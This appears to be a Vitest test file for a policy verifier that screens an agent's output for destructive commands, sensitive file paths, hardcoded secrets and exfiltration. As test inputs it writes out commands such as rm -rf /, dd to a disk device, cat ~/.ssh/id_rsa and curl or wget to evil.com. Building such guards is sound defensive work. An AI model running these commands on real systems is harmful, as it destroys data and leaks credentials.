import { describe, it, expect } from "vitest";
import { PolicyVerifier, type PolicyRule } from "../src/policy-verifier.js";
import { WorkingMemory } from "../src/memory.js";

function memoryWith(artifact: string, task = ""): WorkingMemory {
  const mem = new WorkingMemory();
  if (task) mem.setTask(task);
  mem.setFinalCandidate(artifact);
  return mem;
}

describe("PolicyVerifier", () => {
  const verifier = new PolicyVerifier();

  describe("destructive commands", () => {
    it("denies rm -rf", async () => {
      const mem = memoryWith("rm -rf /");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("cmd-rm-rf");
    });

    it("denies DROP TABLE", async () => {
      const mem = memoryWith("DROP TABLE users;");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("cmd-drop-table");
    });

    it("denies TRUNCATE TABLE", async () => {
      const mem = memoryWith("TRUNCATE TABLE logs;");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("cmd-truncate");
    });

    it("denies dd if=", async () => {
      const mem = memoryWith("dd if=/dev/zero of=/dev/sda");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("cmd-dd");
    });

    it("denies chmod 777", async () => {
      const mem = memoryWith("chmod 777 /var/www");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("cmd-chmod-777");
    });

    it("denies mkfs", async () => {
      const mem = memoryWith("mkfs.ext4 /dev/sda1");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("cmd-mkfs");
    });
  });

  describe("sensitive file paths", () => {
    it("denies .ssh/ access in artifact", async () => {
      const mem = memoryWith("cat ~/.ssh/id_rsa");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("path-ssh");
    });

    it("denies /etc/passwd in task", async () => {
      const mem = memoryWith("safe code", "read /etc/passwd");
      const result = await verifier.verify(mem, { task: "read /etc/passwd" });
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("path-etc-passwd");
    });

    it("denies /etc/shadow", async () => {
      const mem = memoryWith("cat /etc/shadow");
      const result = await verifier.verify(mem, { task: "cat /etc/shadow" });
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("path-etc-shadow");
    });

    it("denies credentials.json", async () => {
      const mem = memoryWith("open credentials.json");
      const result = await verifier.verify(mem, { task: "open credentials.json" });
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("path-credentials");
    });
  });

  describe("hardcoded secrets", () => {
    it("denies hardcoded API key", async () => {
      const mem = memoryWith('const api_key = "sk-1234567890abcdefghij1234"');
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("secret-api-key");
    });

    it("denies hardcoded password", async () => {
      const mem = memoryWith('password = "supersecret123"');
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("secret-password");
    });

    it("denies private key material", async () => {
      const mem = memoryWith("-----BEGIN RSA PRIVATE KEY-----\nMIIE...");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("secret-private-key");
    });

    it("denies hardcoded token", async () => {
      const mem = memoryWith('const secret = "abcdefghijklmnopqrstuvwxyz"');
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("secret-token");
    });
  });

  describe("exfiltration", () => {
    it("denies curl POST", async () => {
      const mem = memoryWith("curl -X POST http://evil.com/steal");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("exfil-curl-post");
    });

    it("denies wget http", async () => {
      const mem = memoryWith("wget http://evil.com/payload");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("exfil-wget");
    });
  });

  describe("safe content passes", () => {
    it("passes clean code", async () => {
      const mem = memoryWith("function add(a: number, b: number): number { return a + b; }");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(true);
      expect(result.evidence).toContain("passed");
    });

    it("passes with empty artifact", async () => {
      const mem = memoryWith("");
      const result = await verifier.verify(mem);
      expect(result.passed).toBe(true);
    });
  });

  describe("custom rules", () => {
    it("adds custom deny rule", async () => {
      const custom: PolicyRule = {
        id: "custom-no-foo",
        description: "No foo allowed",
        target: "artifact",
        pattern: "\\bfoo\\b",
        action: "deny",
        category: "custom",
        enabled: true,
      };
      const v = new PolicyVerifier([custom]);
      const mem = memoryWith("const foo = 42;");
      const result = await v.verify(mem);
      expect(result.passed).toBe(false);
      expect(result.evidence).toContain("custom-no-foo");
    });

    it("allow rule overrides deny in same category", async () => {
      const allowRule: PolicyRule = {
        id: "allow-destructive-cmd",
        description: "Allow destructive commands for this context",
        target: "artifact",
        pattern: ".",
        action: "allow",
        category: "destructive-cmd",
        enabled: true,
      };
      const v = new PolicyVerifier([allowRule]);
      const mem = memoryWith("rm -rf /tmp/test");
      const result = await v.verify(mem);
      // destructive-cmd category is allowed, so rm -rf passes
      expect(result.passed).toBe(true);
    });

    it("disabled rule is skipped", async () => {
      const custom: PolicyRule = {
        id: "disabled-rule",
        description: "Disabled deny",
        target: "artifact",
        pattern: ".*",
        action: "deny",
        category: "test",
        enabled: false,
      };
      const v = new PolicyVerifier([custom]);
      const mem = memoryWith("anything here");
      const result = await v.verify(mem);
      expect(result.passed).toBe(true);
    });
  });

  it("reports multiple violations", async () => {
    const mem = memoryWith("rm -rf / && chmod 777 /var");
    const result = await verifier.verify(mem);
    expect(result.passed).toBe(false);
    expect(result.evidence).toContain("cmd-rm-rf");
    expect(result.evidence).toContain("cmd-chmod-777");
  });

  it("has verifierName set", async () => {
    const mem = memoryWith("safe");
    const result = await verifier.verify(mem);
    expect(result.verifierName).toBe("PolicyVerifier");
  });
});
